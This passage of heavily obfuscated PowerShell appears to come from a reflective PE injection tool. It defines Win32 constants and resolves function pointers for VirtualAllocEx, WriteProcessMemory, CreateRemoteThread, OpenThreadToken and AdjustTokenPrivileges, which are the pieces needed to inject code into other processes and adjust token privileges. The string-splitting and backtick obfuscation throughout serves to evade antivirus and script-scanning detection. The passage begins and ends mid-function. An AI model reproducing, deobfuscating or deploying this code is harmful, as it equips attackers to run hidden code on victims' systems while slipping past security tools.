		    ${w`i`N32Co`NSTA`NtS} | &("{0}{1}{2}"-f'Add','-Mem','ber') -MemberType ("{1}{0}{2}"-f'e','Not','Property') -Name ("{0}{4}{5}{1}{2}{3}" -f 'I','S','OL','UTE','MAGE_REL_B','ASED_AB') -Value 0
		    ${Wi`N32CO`NS`Ta`NtS} | &("{2}{1}{0}{3}" -f 'e','b','Add-Mem','r') -MemberType ("{1}{0}{3}{2}"-f'oteP','N','ty','roper') -Name ("{3}{7}{1}{2}{5}{4}{0}{6}" -f'O','BA','SE','IMAG','_HIGHL','D','W','E_REL_') -Value 3
		    ${W`In32`cONS`Ta`NtS} | &("{1}{0}{3}{2}"-f 'dd','A','ber','-Mem') -MemberType ("{3}{1}{0}{2}"-f'Pr','te','operty','No') -Name ("{1}{2}{4}{3}{0}" -f '64','IMAGE_REL_B','AS','D_DIR','E') -Value 10
		    ${WI`N32cOn`s`Tants} | &("{3}{1}{0}{2}" -f'em','dd-M','ber','A') -MemberType ("{2}{1}{0}"-f'rty','tePrope','No') -Name ("{4}{3}{2}{1}{0}" -f 'DABLE','M_DISCAR','ME','CN_','IMAGE_S') -Value 0x02000000
		    ${Wi`N32C`OnsTAntS} | &("{1}{0}{2}{3}" -f 'd-','Ad','Mem','ber') -MemberType ("{1}{2}{3}{0}"-f 'y','No','teProper','t') -Name ("{0}{1}{4}{3}{2}"-f 'IMAGE_SCN','_ME','CUTE','EXE','M_') -Value 0x20000000
		    ${WIn`32`cON`stAnTs} | &("{2}{0}{3}{1}" -f'd-','mber','Ad','Me') -MemberType ("{0}{1}{3}{2}" -f 'N','oteProp','rty','e') -Name ("{3}{1}{2}{0}{4}" -f 'SCN_MEM_','MA','GE_','I','READ') -Value 0x40000000
		    ${WI`N32`c`onstaNtS} | &("{0}{2}{1}" -f 'Add-Me','r','mbe') -MemberType ("{0}{1}{2}" -f 'Note','Prope','rty') -Name ("{0}{3}{1}{2}{5}{4}"-f'IMAGE_S','N_M','EM_WRI','C','E','T') -Value 0x80000000
		    ${W`In3`2CoNsTA`N`Ts} | &("{1}{0}{2}" -f '-Membe','Add','r') -MemberType ("{2}{0}{1}{3}"-f 'eProper','t','Not','y') -Name ("{4}{1}{3}{5}{0}{2}" -f 'T_CAC','E','HED','M_','IMAGE_SCN_M','NO') -Value 0x04000000
		    ${w`i`N32COn`sTanTS} | &("{2}{1}{0}{3}"-f'Me','dd-','A','mber') -MemberType ("{1}{2}{3}{0}"-f'y','NoteP','rope','rt') -Name ("{1}{0}{2}"-f'M','ME','_DECOMMIT') -Value 0x4000
		    ${w`IN3`2cON`st`ANts} | &("{0}{1}{3}{2}"-f 'Add-','M','r','embe') -MemberType ("{0}{2}{1}"-f 'NoteProp','ty','er') -Name ("{5}{2}{3}{1}{6}{0}{4}"-f'L','X','ILE','_E','E_IMAGE','IMAGE_F','ECUTAB') -Value 0x0002
		    ${w`in32`c`oNSTanTS} | &("{1}{0}{2}" -f'emb','Add-M','er') -MemberType ("{2}{1}{3}{0}"-f'y','ote','N','Propert') -Name ("{4}{0}{1}{2}{3}" -f'E_FILE_','D','L','L','IMAG') -Value 0x2000
		    ${wi`N32c`oNStaN`TS} | &("{1}{0}{2}" -f'd-Me','Ad','mber') -MemberType ("{1}{2}{0}"-f 'rty','N','otePrope') -Name ("{4}{10}{3}{6}{5}{1}{7}{0}{9}{8}{2}" -f'_','STI','_BASE','LLCH','IMAG','RI','ARACTE','CS','MIC','DYNA','E_D') -Value 0x40
		    ${W`in3`2cO`NSta`NTS} | &("{2}{1}{0}" -f'er','b','Add-Mem') -MemberType ("{2}{0}{1}{3}" -f'oteP','rop','N','erty') -Name ("{3}{5}{0}{4}{1}{2}"-f 'E_DL','ARACTERI','STICS_NX_COMPAT','I','LCH','MAG') -Value 0x100
		    ${Win`32coN`sTaNTS} | &("{2}{3}{0}{1}"-f 'mb','er','Add-','Me') -MemberType ("{2}{0}{3}{1}" -f'eProp','y','Not','ert') -Name ("{1}{3}{0}{2}" -f'AS','MEM_','E','RELE') -Value 0x8000
		    ${w`i`N32co`N`StAntS} | &("{0}{1}{2}" -f 'Add-','Memb','er') -MemberType ("{1}{0}{2}"-f 'o','NotePr','perty') -Name ("{2}{0}{1}{3}" -f 'KE','N','TO','_QUERY') -Value 0x0008
		    ${wiN32c`onStA`N`TS} | &("{0}{1}{2}"-f 'Add-M','e','mber') -MemberType ("{0}{2}{1}"-f 'N','eProperty','ot') -Name ("{4}{0}{3}{1}{6}{5}{2}"-f'OKE','JUS','ES','N_AD','T','PRIVILEG','T_') -Value 0x0020
		    ${wiN`32`Co`N`STaNtS} | &("{0}{2}{1}"-f'Add-','ber','Mem') -MemberType ("{0}{1}{3}{2}"-f'NotePro','per','y','t') -Name ("{0}{2}{4}{1}{3}"-f'SE_P','ABLE','RIV','D','ILEGE_EN') -Value 0x2
		    ${wIn32C`O`N`sTANtS} | &("{0}{2}{1}"-f 'A','-Member','dd') -MemberType ("{0}{2}{1}"-f'N','y','otePropert') -Name ("{0}{2}{1}{3}"-f 'ER','OR_','R','NO_TOKEN') -Value 0x3f0
		
		    return ${WIN3`2CoNsTan`TS}
	    }

	    Function g`ET-w`in32FUN`C`TiONS
	    {
		    ${w`I`N3`2`FuNCtiONs} = &("{0}{1}{2}"-f 'N','ew','-Object') ("{0}{3}{2}{1}"-f'System.','t','c','Obje')
		
		    ${vI`RtuaL`Al`LOC`ADdr} = &("{3}{1}{0}{4}{2}"-f 'oc','et-Pr','ss','G','Addre') ("{1}{2}{0}"-f '32.dll','kern','el') ("{2}{1}{0}{3}"-f'lo','tualAl','Vir','c')
		    ${Vi`R`T`Ual`ALLO`CDElEga`TE} = &("{3}{1}{2}{4}{0}" -f'ype','t-D','el','Ge','egateT') @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		    ${VirT`U`ALA`llOc} =   ( &('gI')  ("{1}{2}{4}{3}{0}"-f'FI2Wh','V','ARi','Z','AbLE:') )."VA`lUe"::("{3}{2}{5}{1}{6}{0}{4}" -f'e','onP','legateFo','GetDe','r','rFuncti','oint').Invoke(${v`Ir`Tu`AlA`LlOcA`Ddr}, ${VIr`TUalALlo`C`deLEgATe})
		    ${WI`N32fUNctI`o`NS} | &("{3}{2}{1}{0}"-f'r','mbe','Me','Add-') ("{1}{0}{2}"-f'ePropert','Not','y') -Name ("{0}{2}{1}" -f 'V','loc','irtualAl') -Value ${VirtUAlA`l`loc}
		
		    ${VirtUAL`A`LloC`eXa`d`dR} = &("{3}{1}{2}{0}" -f's','ProcAdd','res','Get-') ("{0}{2}{1}" -f 'k','2.dll','ernel3') ("{1}{3}{2}{4}{0}" -f 'Ex','V','All','irtual','oc')
		    ${vi`RTualALLocE`x`DelEGa`TE} = &("{1}{0}{2}"-f'lega','Get-De','teType') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		    ${vI`RtUaL`Al`LO`cEx} =   ( &("{2}{0}{1}"-f'H','iLditEM','GET-c') ("{2}{1}{0}{3}" -f 'Bl','ARIA','v','E:ZfI2wH'))."Val`UE"::("{1}{2}{3}{6}{0}{4}{5}"-f'nPo','GetDel','ega','teForFuncti','int','er','o').Invoke(${VIrT`UaLalLoCex`A`dDR}, ${vi`RTU`AlaLLocE`XD`ELE`ga`TE})
		    ${W`i`N32F`UnCTIoNS} | &("{0}{1}{2}" -f'A','dd-','Member') ("{2}{0}{1}"-f 'o','teProperty','N') -Name ("{2}{1}{3}{0}" -f 'ocEx','tualA','Vir','ll') -Value ${vI`Rt`UAl`ALloc`eX}
		
		    ${meMc`PyAd`Dr} = &("{2}{3}{0}{4}{1}" -f '-Pro','s','G','et','cAddres') ("{2}{1}{0}"-f 'rt.dll','c','msv') ("{1}{2}{0}"-f'mcpy','m','e')
		    ${MeMcp`YDe`lEGa`Te} = &("{2}{0}{3}{1}{4}"-f'e','elegat','G','t-D','eType') @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		    ${mE`MCpy} =  (  &("{1}{0}" -f'm','ItE') ("{0}{3}{1}{2}" -f'VAri','fi2w','h','aBLE:Z') )."v`AluE"::("{1}{3}{0}{4}{2}" -f 'at','G','tionPointer','etDeleg','eForFunc').Invoke(${m`eM`CPYAD`dR}, ${M`EM`c`pYDELE`gatE})
		    ${win`32fu`Ncti`o`NS} | &("{1}{2}{0}"-f 'ber','Add-','Mem') -MemberType ("{1}{0}{2}"-f 't','No','eProperty') -Name ("{1}{0}"-f 'cpy','mem') -Value ${me`mCPY}
		
		    ${me`m`sETaDDR} = &("{2}{1}{3}{0}" -f's','t-ProcAddr','Ge','es') ("{1}{2}{0}" -f'll','m','svcrt.d') ("{1}{0}"-f 'mset','me')
		    ${mE`mS`E`TDElEGA`TE} = &("{4}{3}{1}{2}{0}" -f 'ype','ate','T','t-Deleg','Ge') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		    ${Me`mseT} =   (  &("{1}{0}{2}"-f'L','cHi','ditEM')  ("{1}{0}{2}{3}"-f 'riAb','VA','le:','Zfi2wH')  )."val`Ue"::("{3}{2}{6}{5}{4}{1}{0}"-f 'er','Point','at','GetDeleg','on','ncti','eForFu').Invoke(${M`eM`s`ETaddr}, ${MeM`SET`dEL`egatE})
		    ${w`i`N32FUnc`Tio`Ns} | &("{0}{2}{1}" -f 'A','Member','dd-') -MemberType ("{2}{3}{1}{0}"-f'erty','p','NotePr','o') -Name ("{2}{1}{0}"-f'et','s','mem') -Value ${mEM`S`Et}
		
		    ${LOADl`iBR`AR`Yad`DR} = &("{3}{4}{2}{0}{1}"-f's','s','dre','Get-Pro','cAd') ("{0}{1}{2}{3}"-f'ker','nel32','.d','ll') ("{1}{3}{0}{2}" -f 'Lib','Lo','raryA','ad')
		    ${lo`Ad`LIbrarYd`eL`Ega`Te} = &("{3}{1}{0}{2}"-f'elega','D','teType','Get-') @([String]) ([IntPtr])
		    ${LOad`lI`BrARY} =  ( &("{2}{1}{0}" -f'ble','A','vaRI')  ("{0}{1}" -f'Z','fI2wH'))."Va`LUe"::("{1}{4}{0}{3}{2}" -f 'eForFunctionPoi','Ge','ter','n','tDelegat').Invoke(${l`oa`D`l`ibRaRyadDr}, ${LoAdliBRA`Ry`Dele`g`ATE})
		    ${wI`N3`2functI`oNS} | &("{0}{1}{3}{2}"-f'A','dd','er','-Memb') -MemberType ("{3}{2}{1}{0}"-f'y','pert','tePro','No') -Name ("{0}{1}{2}{3}"-f 'LoadL','i','bra','ry') -Value ${LOAD`LIBR`A`Ry}
		
		    ${getp`RoCAdD`R`e`ssa`d`Dr} = &("{0}{3}{4}{1}{2}"-f 'Get-Pro','es','s','cAdd','r') ("{2}{3}{0}{1}" -f 'el32.d','ll','k','ern') ("{2}{0}{1}" -f'ro','cAddress','GetP')
		    ${GETproC`Ad`dR`es`sDelegAtE} = &("{2}{1}{0}{3}" -f 'y','et-DelegateT','G','pe') @([IntPtr], [String]) ([IntPtr])
		    ${GeT`Pr`oCADDr`Ess} =  ( &("{1}{0}" -f 'm','iTE') ("VA"+"Ria"+"bL"+"e:zfI2wh") )."VAL`Ue"::("{0}{1}{6}{3}{7}{2}{4}{5}{8}" -f 'Get','D','in','teFo','t','e','elega','rFunctionPo','r').Invoke(${GetPro`ca`DDR`eSSad`Dr}, ${gET`p`RoCa`ddrEssdEL`eg`A`TE})
		    ${WIN`32funcT`IOns} | &("{0}{1}{2}" -f'Ad','d-Me','mber') -MemberType ("{2}{1}{3}{0}" -f 'y','Pro','Note','pert') -Name ("{2}{0}{1}"-f'ocAddre','ss','GetPr') -Value ${GeTp`RoCadDrE`ss}
		
		    ${G`etP`ROca`d`DRESSoRDiNa`Laddr} = &("{0}{3}{1}{2}" -f 'G','ProcA','ddress','et-') ("{3}{0}{2}{1}"-f'ne','.dll','l32','ker') ("{0}{1}{2}{3}" -f'Get','Pr','ocAd','dress')
		    ${g`EtP`Ro`cAd`dr`es`sorD`iNaLDELEGAtE} = &("{2}{0}{1}{3}" -f'-D','ele','Get','gateType') @([IntPtr], [IntPtr]) ([IntPtr])
		    ${GEt`prOCaDDrEs`SOrD`I`NaL} =   (&('LS')  ("{2}{1}{4}{0}{3}"-f':','aRiaBL','V','ZFi2Wh','e'))."VAl`UE"::("{6}{5}{2}{8}{1}{0}{7}{4}{3}" -f'tio','Func','F','ointer','P','gate','GetDele','n','or').Invoke(${GET`Procadd`RE`SSOrD`iNAlaDdr}, ${G`ETpro`caDdrEsso`R`Di`NaLDeleGaTE})
		    ${Win32f`Unc`TI`O`NS} | &("{2}{0}{1}"-f'em','ber','Add-M') -MemberType ("{1}{2}{0}{3}" -f't','NotePrope','r','y') -Name ("{2}{6}{0}{3}{4}{1}{5}" -f 'Addr','din','GetPro','ess','Or','al','c') -Value ${gEtpROCaDdRE`sSOrd`I`Nal}
		
		    ${vI`RTual`F`ReeaDdR} = &("{1}{2}{0}{3}{4}" -f 'dr','Get','-ProcAd','e','ss') ("{0}{2}{1}" -f'ke','el32.dll','rn') ("{0}{2}{3}{1}"-f 'Virtu','e','al','Fre')
		    ${vIrtU`AlFr`eEd`ele`GaTE} = &("{2}{0}{3}{1}"-f 'elega','e','Get-D','teTyp') @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		    ${vIrTu`A`l`Free} =  ${ZFi`2`Wh}::("{1}{2}{5}{4}{0}{3}{6}" -f'orFuncti','Ge','t','o','legateF','De','nPointer').Invoke(${virTUa`LFre`E`AdDR}, ${vIRTU`AlF`ReEd`E`LEGa`TE})
		    ${W`I`N`32fUNctI`ONS} | &("{2}{0}{1}" -f'emb','er','Add-M') ("{0}{1}{2}{3}" -f'NoteP','rop','er','ty') -Name ("{1}{2}{0}{3}"-f'ual','V','irt','Free') -Value ${VIRt`Ua`Lf`ReE}
		
		    ${virTu`Alfr`Eee`X`ADDr} = &("{0}{3}{2}{1}" -f'Ge','Address','-Proc','t') ("{2}{1}{0}{3}"-f'32','rnel','ke','.dll') ("{2}{3}{1}{0}" -f 'eEx','alFre','Virt','u')
		    ${virt`UAl`FREEexdELe`gate} = &("{1}{2}{4}{3}{0}"-f 'e','Get-D','el','Typ','egate') @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		    ${VIrtU`A`lFRee`ex} =  ${zf`I2Wh}::("{6}{2}{7}{1}{3}{4}{0}{5}"-f'nPoi','ForF','a','u','nctio','nter','GetDeleg','te').Invoke(${v`I`R`T`UaL`FreeexaDdr}, ${V`IrtU`ALFreEExd`ElEga`TE})
		    ${WiN32f`UnCTiO`Ns} | &("{2}{1}{0}" -f 'Member','d-','Ad') ("{1}{0}{2}" -f'ePr','Not','operty') -Name ("{3}{1}{0}{2}"-f'tu','ir','alFreeEx','V') -Value ${VIrt`UA`lFr`Ee`EX}
		
		    ${V`irtu`Al`prOTEcta`d`DR} = &("{3}{0}{2}{1}" -f'-Pro','ress','cAdd','Get') ("{2}{1}{0}" -f'.dll','rnel32','ke') ("{0}{3}{2}{1}" -f'Vir','ct','ualProte','t')
		    ${Virtu`ALPR`oTE`c`Td`EL`egATE} = &("{4}{2}{3}{1}{0}" -f 'eType','t','g','a','Get-Dele') @([IntPtr], [UIntPtr], [UInt32],   ( &("{1}{0}{2}" -f'e','get-It','m') ('vaRIAblE'+':'+'Ku'+'0C'))."V`ALUe".("{1}{3}{2}{4}{0}" -f'fType','Mak','B','e','yRe').Invoke()) ([Bool])
		    ${V`Irt`UalPRO`TEcT} =  ( &("{0}{1}{2}"-f'ChIld','itE','m')  ("{2}{3}{0}{1}"-f 'fi2w','H','varIa','BLe:z'))."v`AluE"::("{2}{3}{4}{0}{1}"-f'teForFunctionPoin','ter','GetDe','le','ga').Invoke(${viR`TUAL`prOTEcT`AD`dr}, ${ViRTUalP`R`OtE`ctDE`lEG`A`Te})
		    ${wi`N32F`U`NC`Tions} | &("{0}{1}{2}" -f'A','dd-Memb','er') ("{0}{1}{2}{3}"-f 'Not','e','Proper','ty') -Name ("{1}{0}{2}{3}" -f'r','VirtualP','ot','ect') -Value ${vIrTua`Lp`R`otECT}
		
		    ${GetMOD`Uleha`N`dlea`DDR} = &("{1}{3}{2}{0}{4}"-f 'cAdd','G','t-Pro','e','ress') ("{0}{1}{2}" -f'k','ernel32','.dll') ("{0}{1}{3}{2}" -f 'GetMod','u','andleA','leH')
		    ${G`eTmOdULeHAndLed`E`Le`Ga`TE} = &("{0}{2}{4}{3}{1}{5}" -f'Get-','teTy','D','a','eleg','pe') @([String]) ([IntPtr])
		    ${GE`T`moD`U`LeHANDLe} =   ${zF`I`2WH}::("{7}{1}{4}{5}{0}{6}{3}{2}"-f'Func','el','r','ointe','e','gateFor','tionP','GetD').Invoke(${geTmO`d`UL`ehA`NDlea`DDr}, ${geTm`ODUlE`H`ANd`Lede`legatE})
		    ${win3`2Fu`NCTIO`Ns} | &("{2}{0}{1}" -f'dd-Mem','ber','A') ("{0}{2}{1}"-f 'No','eProperty','t') -Name ("{3}{0}{1}{2}" -f'ModuleH','an','dle','Get') -Value ${gEtm`O`dULeHAND`Le}
		
		    ${f`Reelib`RA`Ryad`dR} = &("{3}{2}{0}{4}{1}"-f 'cAd','ss','et-Pro','G','dre') ("{3}{1}{0}{2}"-f 'd','el32.','ll','kern') ("{1}{2}{3}{0}"-f 'rary','F','ree','Lib')
		    ${Fr`eelibr`Aryd`EL`E`GAtE} = &("{2}{3}{0}{1}"-f'l','egateType','G','et-De') @([Bool]) ([IntPtr])
		    ${FReEl`iB`RarY} =   (  &("{2}{0}{3}{1}" -f't-vA','E','Ge','RIABL') ('Zf'+'i2wH'))."vaL`UE"::("{4}{1}{0}{2}{3}{6}{5}"-f'eFo','t','rFu','n','GetDelega','tionPointer','c').Invoke(${fRE`eLib`RaRy`Addr}, ${f`ReeLIbr`A`RydEl`eGATE})
		    ${win`32funCTIO`NS} | &("{1}{2}{0}" -f '-Member','A','dd') -MemberType ("{2}{1}{0}{3}"-f'pert','tePro','No','y') -Name ("{3}{1}{0}{2}"-f'ibrar','reeL','y','F') -Value ${FR`Ee`LIbra`Ry}
		
		    ${ope`NP`R`oCeSs`ADDR} = &("{1}{0}{2}{3}{4}" -f '-ProcA','Get','ddre','s','s') ("{2}{0}{1}{3}"-f'ern','el32.dl','k','l') ("{0}{1}{2}{3}" -f'Op','e','nP','rocess')
	        ${Ope`N`PRO`cESSDEl`E`g`Ate} = &("{0}{2}{3}{1}"-f 'Ge','ateType','t-Dele','g') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	        ${oP`e`Np`ROCEss} =   (  &("{1}{0}" -f'i','gc') ("Vari"+"a"+"ble:ZFi2w"+"H")  )."V`Alue"::("{3}{4}{0}{1}{2}{5}{6}"-f'tDele','gateForFunctio','nPo','G','e','i','nter').Invoke(${oPEn`pr`oCeS`S`ADDr}, ${o`pENpROcE`sSDe`L`e`gA`Te})
		    ${w`In32`FuNc`Ti`ONs} | &("{2}{1}{0}"-f'r','dd-Membe','A') -MemberType ("{3}{2}{1}{0}" -f'erty','rop','oteP','N') -Name ("{2}{0}{1}" -f 'ces','s','OpenPro') -Value ${ope`NPR`OcesS}
		
		    ${WaiT`Fo`RSIngLeobJ`e`CTAddR} = &("{0}{4}{3}{1}{2}" -f'Ge','Addres','s','-Proc','t') ("{1}{2}{0}{3}"-f'.dl','kernel','32','l') ("{4}{3}{0}{1}{2}" -f'orSin','gleOb','ject','tF','Wai')
	        ${Wai`TfORsI`NGLE`oBJECtDelEga`TE} = &("{3}{4}{0}{2}{1}{5}" -f '-Del','gateTy','e','Ge','t','pe') @([IntPtr], [UInt32]) ([UInt32])
	        ${waitf`Or`Sin`gl`E`oBJ`ECT} =  ( &("{2}{1}{0}" -f'e','abL','vArI') ('zF'+'I2Wh')  )."val`UE"::("{3}{6}{0}{2}{5}{1}{4}" -f'tDe','nt','legateFor','G','er','FunctionPoi','e').Invoke(${waiTfO`Rs`i`N`GLEObJECTADdr}, ${wAIt`F`OrS`iN`G`LEobj`ecTDeLeg`ATE})
		    ${WIn32FUn`CtI`o`NS} | &("{0}{2}{1}" -f 'A','mber','dd-Me') -MemberType ("{2}{0}{1}" -f'ote','Property','N') -Name ("{3}{1}{6}{2}{5}{0}{4}" -f'eObj','itFor','i','Wa','ect','ngl','S') -Value ${WAi`Tf`OR`sINgLE`o`Bj`Ect}
		
		    ${w`R`ItEproCe`s`smem`o`RyADDr} = &("{4}{1}{0}{3}{2}" -f't-ProcA','e','ress','dd','G') ("{1}{3}{2}{0}"-f 'dll','ke','nel32.','r') ("{1}{5}{2}{0}{4}{3}"-f 'Memo','WritePro','s','y','r','ces')
            ${WRitEPROCEsS`memOR`yd`ElE`gaTe} = &("{1}{3}{0}{2}"-f 'gateTy','Get-De','pe','le') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   (&("{2}{3}{0}{1}" -f 'vArIabL','e','Get','-')  ('0Om'+'41')  -VAlUeoNLY).("{2}{1}{0}" -f'yRefType','eB','Mak').Invoke()) ([Bool])
            ${WRit`E`PrO`cesSM`eMorY} =   (&("{1}{3}{2}{0}" -f'abLE','Get','ri','-VA') ("{0}{1}"-f'Z','Fi2Wh') -VAlUEoN)::("{6}{4}{5}{1}{2}{0}{7}{3}" -f 'Function','F','or','r','t','e','GetDelega','Pointe').Invoke(${W`RiTE`P`ROc`EsSmEmor`Ya`ddr}, ${W`RI`TeproCEssM`Em`oRydE`L`E`G`ATe})
		    ${W`In`32FuNcTi`ONs} | &("{1}{0}{2}" -f 'Memb','Add-','er') -MemberType ("{1}{3}{2}{0}" -f'perty','Not','o','ePr') -Name ("{3}{0}{2}{1}" -f'r','ssMemory','oce','WriteP') -Value ${wri`Te`pro`cess`mEmoRY}
		
		    ${re`Adp`Ro`cEssmEM`oR`Y`ADdR} = &("{2}{1}{0}{3}" -f 'Addr','-Proc','Get','ess') ("{0}{3}{2}{1}" -f 'ke','l','el32.dl','rn') ("{0}{1}{3}{5}{4}{2}"-f 'Rea','d','y','Proc','mor','essMe')
            ${Rea`DPrOce`SSM`E`MOrYdELE`g`ATe} = &("{4}{1}{3}{0}{2}"-f'e','e','gateType','t-Del','G') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  ${0`o`M41}.("{3}{2}{0}{4}{1}" -f 'f','e','Re','MakeBy','Typ').Invoke()) ([Bool])
            ${REaD`pRo`CE`ssmemo`RY} =  ${zF`i`2wH}::("{4}{0}{1}{5}{6}{3}{2}" -f 'e','tD','tionPointer','rFunc','G','elegat','eFo').Invoke(${ReA`dpro`cESSm`e`mo`R`YADDr}, ${r`EadpROCE`ss`me`MoR`YDELeGAte})
		    ${Win3`2F`U`NCtionS} | &("{2}{1}{0}"-f'er','Memb','Add-') -MemberType ("{1}{2}{0}"-f'teProperty','N','o') -Name ("{2}{3}{1}{0}" -f'mory','Me','ReadProc','ess') -Value ${ReA`dP`RoCessMe`M`ory}
		
		    ${CrEaT`er`emoTEThre`Ad`ADdR} = &("{4}{2}{0}{3}{1}" -f'Ad','ess','Proc','dr','Get-') ("{2}{0}{1}" -f'ernel3','2.dll','k') ("{2}{3}{1}{0}" -f 'hread','teT','Cr','eateRemo')
            ${c`R`E`AteRemO`TE`ThrE`AddE`legaTe} = &("{3}{4}{2}{0}{1}"-f 'Ty','pe','elegate','G','et-D') @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
            ${c`ReA`Te`RE`MOtE`THReAd} =  (&('Ls')  ('vARI'+'a'+'B'+'LE:zfI2wH'))."Va`Lue"::("{4}{1}{3}{2}{5}{0}{6}" -f'int','g','un','ateForF','GetDele','ctionPo','er').Invoke(${CReate`REMOtEth`REadAd`dr}, ${CreA`TeREm`OTEt`Hrea`dDel`eg`Ate})
		    ${wiN`32FUn`C`TiO`NS} | &("{3}{0}{2}{1}"-f'-','mber','Me','Add') -MemberType ("{3}{2}{1}{0}"-f'erty','p','ro','NoteP') -Name ("{3}{4}{0}{1}{2}" -f'eate','RemoteThrea','d','C','r') -Value ${C`Re`A`TerEMoTe`T`hREaD}
		
		    ${ge`TeXi`TCODEt`HreAdADdR} = &("{4}{0}{2}{3}{1}" -f 'et-','dress','ProcA','d','G') ("{1}{3}{2}{0}"-f'l','ker','2.dl','nel3') ("{3}{5}{2}{4}{0}{1}"-f'hre','ad','tE','G','xitCodeT','e')
            ${g`Et`e`xITcoDETHr`EADDELeGa`TE} = &("{1}{0}{3}{2}"-f'-D','Get','eType','elegat') @([IntPtr],   ${w`U6t}.("{2}{3}{1}{0}" -f 'ype','eByRefT','Ma','k').Invoke()) ([Bool])
            ${gEteX`Itc`odETH`R`EAd} =  (&('lS') ("{0}{4}{2}{1}{3}" -f'VARIa','2W',':zFi','h','BLE'))."V`AlUE"::("{5}{3}{4}{2}{0}{1}" -f'nct','ionPointer','egateForFu','e','tDel','G').Invoke(${gete`XITC`o`DEt`HRE`Ad`AddR}, ${GEteXit`CoDeThrea`d`dEL`eG`ATe})
		    ${WIN3`2fuNC`Ti`ONs} | &("{2}{1}{0}" -f '-Member','d','Ad') -MemberType ("{0}{2}{3}{1}"-f'N','rty','ote','Prope') -Name ("{2}{3}{0}{1}{4}"-f'deTh','rea','GetExitC','o','d') -Value ${gE`TE`Xit`COdethreAd}
		
		    ${O`PeNthreA`DTOKenA`D`dR} = &("{0}{4}{3}{1}{2}"-f'Get','ocAdd','ress','Pr','-') ("{0}{2}{3}{1}" -f'A','dll','dva','pi32.') ("{0}{1}{3}{2}" -f'Ope','nThre','Token','ad')
            ${op`EN`THreaD`Tok`ENDele`gATE} = &("{3}{1}{0}{2}"-f'legate','e','Type','Get-D') @([IntPtr], [UInt32], [Bool],  ${b`qta}.("{1}{0}{2}"-f 'eByRefTy','Mak','pe').Invoke()) ([Bool])
            ${OPENtHr`EAdT`o`K`En} =   (  &("{2}{0}{1}"-f'rIA','blE','gET-vA') ('ZfI2'+'wH')  -va  )::("{2}{3}{4}{5}{0}{1}" -f'onPoint','er','Get','D','ele','gateForFuncti').Invoke(${o`PenT`H`Re`A`dtoKeNAdDr}, ${OpE`NthRe`AdTOK`endeLe`GAte})
		    ${W`i`N32`FUNctIOns} | &("{2}{1}{0}"-f 'ber','m','Add-Me') -MemberType ("{1}{3}{2}{0}"-f 'erty','N','rop','oteP') -Name ("{0}{2}{1}{3}"-f'Open','dToke','Threa','n') -Value ${OPEN`ThREaDToK`EN}
		
		    ${gET`cUR`REN`TthREAda`DDr} = &("{0}{2}{1}{3}"-f'Ge','ocAd','t-Pr','dress') ("{3}{2}{0}{1}" -f'rnel32.','dll','e','k') ("{1}{2}{0}{3}" -f 'Th','GetCurren','t','read')
            ${G`et`cuRrE`NTthReAddeL`EgATe} = &("{0}{3}{4}{2}{1}"-f'G','gateType','le','et-D','e') @() ([IntPtr])
            ${GEtC`Urr`enttH`R`e`Ad} =   (&('gI') ("{0}{2}{3}{4}{1}"-f'vArIABlE','h',':Z','Fi','2W'))."v`AluE"::("{1}{6}{8}{3}{0}{4}{2}{7}{5}" -f'teForFun','Get','ion','a','ct','inter','D','Po','eleg').Invoke(${GeTc`UrReNTThR`Ea`dA`dDR}, ${G`etCuRRENtTHRe`AdD`eleGA`Te})
		    ${WiN32FuN`CTi`Ons} | &("{2}{1}{0}"-f'r','d-Membe','Ad') -MemberType ("{0}{2}{1}" -f'NoteP','erty','rop') -Name ("{3}{1}{0}{2}"-f'tTh','etCurren','read','G') -Value ${getCUrrent`T`H`READ}
		
		    ${adj`USTt`oK`En`PRiVIL`e`gesa`DdR} = &("{2}{1}{3}{0}" -f 'ress','ocA','Get-Pr','dd') ("{3}{2}{1}{0}"-f '2.dll','3','vapi','Ad') ("{3}{6}{4}{1}{2}{0}{5}" -f'ivileg','nP','r','Adj','ke','es','ustTo')
            ${ADjusTT`OkE`N`PRiV`IL`egEs`D`e`lEGatE} = &("{4}{0}{1}{2}{3}"-f 't-Delegat','eTy','p','e','Ge') @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
            ${ADj`U`STtOKE`NpRIVil`E`gEs} =  ${Z`F`I2WH}::("{1}{3}{4}{5}{0}{2}"-f'inte','G','r','etDe','legateForFu','nctionPo').Invoke(${aDJ`USttOk`eN`P`RIV`ilegESadDr}, ${Adj`US`TtO`KeNprIv`ilE`gE`sd`eLeGA`Te})
		    ${WI`N32fu`NcT`I`ONS} | &("{1}{2}{0}{3}"-f 'be','Add-','Mem','r') -MemberType ("{3}{1}{0}{2}"-f'e','ot','Property','N') -Name ("{2}{5}{1}{0}{3}{4}"-f 'en','ok','A','P','rivileges','djustT') -Value ${adjUsTTOKE`NPRi`V`il`egES}
		
		    ${LookUpPrIV`ile`GEv`AL`UEaddR} = &("{0}{1}{2}{3}" -f 'Ge','t-Proc','Add','ress') ("{2}{0}{1}{3}"-f 'dvapi32','.d','A','ll') ("{6}{1}{2}{5}{4}{3}{0}"-f 'eA','leg','e','u','l','Va','LookupPrivi')
            ${loO`kuppr`Iv`ile`GEvaLUE`Del`eGatE} = &("{0}{2}{4}{3}{1}"-f'G','pe','et','legateTy','-De') @([String], [String], [IntPtr]) ([Bool])
            ${LoOKUPPRi`VI`LegE`Value} =   ( &("{1}{2}{0}" -f 'le','vAr','Iab') ("{0}{1}" -f 'ZFi2w','H')  -vALu  )::("{5}{3}{1}{8}{4}{7}{0}{2}{6}" -f'Poin','t','te','etDelega','or','G','r','Function','eF').Invoke(${l`ook`U`Pp`R`IVileg`EValuEaD`Dr}, ${lOokUp`prIvI`LEG`eval`UedELE`GaTe})
